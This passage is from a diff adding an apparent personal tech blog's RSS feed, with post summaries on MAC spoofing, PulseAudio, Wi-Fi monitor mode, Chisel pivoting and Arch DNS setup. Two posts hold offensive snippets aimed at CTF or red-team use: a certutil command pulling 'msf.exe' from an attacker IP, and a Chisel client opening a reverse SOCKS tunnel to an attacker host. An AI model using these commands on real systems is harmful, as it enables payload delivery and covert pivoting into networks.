+&lt;p&gt;Create a systemd service to change your MAC address and place it in the &lt;code&gt;/etc/systemd/system/&lt;/code&gt; directory with the name &lt;code&gt;mac-spoofer.service&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /etc/systemd/system/mac-spoofer.service
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Unit]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Description=MAC Address Change/spoofing wlo1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Wants=network-pre.target
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Before=network-pre.target
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;BindsTo=sys-subsystem-net-devices-wlo1.device
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;After=sys-subsystem-net-devices-wlo1.device
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Service]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Type=oneshot
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User=root
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ExecStart=/usr/bin/ifconfig wlo1 down
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ExecStart=/usr/bin/macchanger -r -b wlo1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ExecStart=/usr/bin/ifconfig wlo1 up
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Install]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;WantedBy=multi-user.target
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;step-2-creating-a-dispatcher-script&#34;&gt;Step 2: Creating a Dispatcher Script&lt;/h3&gt;
+&lt;p&gt;Create a script in the &lt;code&gt;/etc/NetworkManager/dispatcher.d/&lt;/code&gt; directory and grant it executable permission. This directory contains scripts to handle various network-related events, which are automatically executed in response to specific events managed by NetworkManager.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Switch Back to PulseAudio</title>
+      <link>http://localhost:1313/posts/tipsandtricks/archlinux/switch_back_to_pulseaudio/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/archlinux/switch_back_to_pulseaudio/</guid>
+      <description>&lt;h3 id=&#34;title-disable-pipewire-audio-service&#34;&gt;Title: Disable Pipewire Audio Service&lt;/h3&gt;
+&lt;p&gt;To disable the Pipewire audio service, run the following commands:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl --user disable pipewire pipewire.socket
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl --user mask pipewire pipewire.socket
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl --user &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt; --now pulseaudio.service
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;uninstalling-pipewire&#34;&gt;Uninstalling Pipewire&lt;/h3&gt;
+&lt;p&gt;To uninstall Pipewire, you can use the following command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;paru -Rdd pipewire-pulse pipewire-support pipewire-alsa
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;installing-pulseaudio&#34;&gt;Installing Pulseaudio&lt;/h3&gt;
+&lt;p&gt;To install Pulseaudio, run:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;paru -S pulseaudio-alsa pulseaudio-bluetooth pulseaudio-equalizer-ladspa pulseaudio-jack pulseaudio-lirc pulseaudio
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+    </item>
+    <item>
+      <title>Table of Contents</title>
+      <link>http://localhost:1313/posts/tipsandtricks/archlinux/interface_managing_guide/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/archlinux/interface_managing_guide/</guid>
+      <description>&lt;h2 id=&#34;airmon-ng&#34;&gt;Airmon-ng&lt;/h2&gt;
+&lt;p&gt;To start monitoring mode on wlan0:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo airmon-ng start wlan0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;iwconfig&#34;&gt;iwconfig&lt;/h2&gt;
+&lt;p&gt;To enable monitor mode using iwconfig:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo ifconfig &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INTERFACE&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; down
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo iwconfig &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INTERFACE&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; mode monitor
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo ifconfig &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INTERFACE&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; up
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;iw&#34;&gt;iw&lt;/h2&gt;
+&lt;p&gt;To enable monitor mode using iw:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo ip link &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INTERFACE&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; down
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo iw &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INTERFACE&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; monitor control
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo ip link &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INTERFACE&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; up
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;adding-a-new-monitor-interface&#34;&gt;Adding a New Monitor Interface&lt;/h3&gt;
+&lt;p&gt;To add a new monitor interface:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo iw &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INTERFACE&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; interface add &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;NEW_INTERFACE&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; monitor
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;aircrack-ng-installation&#34;&gt;Aircrack-ng Installation&lt;/h2&gt;
+&lt;p&gt;To install aircrack-ng:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get update
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get install aircrack-ng
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;airmon-ng-commands&#34;&gt;Airmon-ng Commands&lt;/h2&gt;
+&lt;p&gt;To use airmon-ng commands:&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Tutorial: Downloading Files from Linux to Windows Using Windows CLI</title>
+      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/windows-native-shell/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/windows-native-shell/</guid>
+      <description>&lt;h2 id=&#34;method-1-using-an-http-server&#34;&gt;Method 1: Using an HTTP Server&lt;/h2&gt;
+&lt;h3 id=&#34;step-1-start-an-http-server-on-linux&#34;&gt;Step 1: Start an HTTP server on Linux&lt;/h3&gt;
+&lt;p&gt;Open a terminal on your Linux machine and run:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo python3 -m http.server &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;step-2-download-the-file-using-certutil-on-windows&#34;&gt;Step 2: Download the file using &lt;code&gt;certutil&lt;/code&gt; on Windows&lt;/h3&gt;
+&lt;p&gt;Open Command Prompt or PowerShell on your Windows machine and run:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;certutil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-urlcache&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-split&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-f&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://10.10.14.7/msf.exe&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;method-2-using-invoke-webrequest&#34;&gt;Method 2: Using &lt;code&gt;Invoke-WebRequest&lt;/code&gt;&lt;/h2&gt;
+&lt;h3 id=&#34;step-1-start-an-http-server-on-linux-1&#34;&gt;Step 1: Start an HTTP server on Linux&lt;/h3&gt;
+&lt;p&gt;Same as Step 1 in Method 1.&lt;/p&gt;
+&lt;h3 id=&#34;step-2-download-the-file-using-invoke-webrequest-on-windows&#34;&gt;Step 2: Download the file using &lt;code&gt;Invoke-WebRequest&lt;/code&gt; on Windows&lt;/h3&gt;
+&lt;p&gt;Open PowerShell on your Windows machine and run:&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>🛠️ Chisel Port Forwarding Guide</title>
+      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/%EF%B8%8F-chisel-port-forwarding-guide/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/%EF%B8%8F-chisel-port-forwarding-guide/</guid>
+      <description>&lt;hr&gt;
+&lt;h2 id=&#34;-what-is-chisel&#34;&gt;🧠 What is Chisel?&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Chisel&lt;/strong&gt; is a fast TCP/UDP tunnel over HTTP, useful for &lt;strong&gt;port forwarding&lt;/strong&gt; and &lt;strong&gt;pivoting&lt;/strong&gt;, especially during red teaming or CTFs.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;-attacker-machine-setup-chisel-server&#34;&gt;🔥 Attacker Machine Setup (Chisel Server)&lt;/h2&gt;
+&lt;p&gt;Start Chisel in &lt;strong&gt;reverse mode&lt;/strong&gt; on the attacker machine:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./chisel_1.5.1 server -p &lt;span class=&#34;m&#34;&gt;9005&lt;/span&gt; --reverse
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-p 9005&lt;/code&gt;: Listen on port 9005&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--reverse&lt;/code&gt;: Accept reverse port forwarding connections&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;-target-machine-setup-chisel-client&#34;&gt;🎯 Target Machine Setup (Chisel Client)&lt;/h2&gt;
+&lt;h3 id=&#34;forward-all-traffic-to-attacker&#34;&gt;Forward all traffic to attacker:&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./chisel client 10.10.14.19:9005 R:socks
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;This sets up a &lt;strong&gt;SOCKS proxy&lt;/strong&gt; from the target to the attacker&amp;rsquo;s Chisel server&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Configure Custom DNS Servers in Arch based Linux.</title>
+      <link>http://localhost:1313/posts/tipsandtricks/archlinux/change_dns_in_arch_linux/</link>
+      <pubDate>Sat, 13 Jan 2024 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/archlinux/change_dns_in_arch_linux/</guid>
+      <description>&lt;h4 id=&#34;first-of-all-check-openresolv-package-is-installed-in-your-system-or-not-if-not-then-simply-install-it-by&#34;&gt;First of all, check &lt;code&gt;openresolv&lt;/code&gt; package is installed in your system or not. if not then simply install it by:&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo pacman -S extra/openresolv
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;step-2-remove-immutable-permissions&#34;&gt;Step 2: Remove Immutable Permissions&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Check for immutable permissions on /etc/resolv.conf&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lsattr /etc/resolv*
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# If immutable permissions exist, them remove it by&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo chattr -i /etc/resolv.conf
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;step-3-set-custom-dns-servers&#34;&gt;Step 3: Set Custom DNS Servers&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Edit the resolvconf.conf file&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo nano /etc/resolvconf.conf
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Configuration for resolvconf(8)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# See resolvconf.conf(5) for details&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;resolv_conf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/etc/resolv.conf
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# If you run a local name server, you should uncomment the below line and&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# configure your subscribers configuration files below.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#name_servers=127.0.0.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;###### Block malware with 1.1.1.1 for Families #####&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;name_servers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1.0.0.2
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;name_servers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1.1.1.2
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;###### Use 1.1.1.1 resolver ######&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;name_servers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1.0.0.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;name_servers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1.1.1.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;###### AdGuard DNS ######&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# name_servers=94.140.14.59&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# name_servers=94.140.14.49&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;######### AdGuard Non-filtering DNS #######&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;name_servers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;94.140.14.141
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;name_servers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;94.140.14.140
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;enable-dhcpcd-services-to-work-custom-dns-if-it-is-not-installed-in-your-system-then-install-it-by&#34;&gt;Enable &lt;code&gt;dhcpcd&lt;/code&gt; services to work Custom DNS. if it is not installed in your system then install it by&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo pacman -S extra/dhcpcd 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo systemctl &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt; --now dhcpcd.service
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Conclusion:&lt;/strong&gt;
+You&amp;rsquo;ve successfully configured custom DNS servers on Arch based Linux. Enjoy improved network security and privacy with your chosen DNS servers.&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
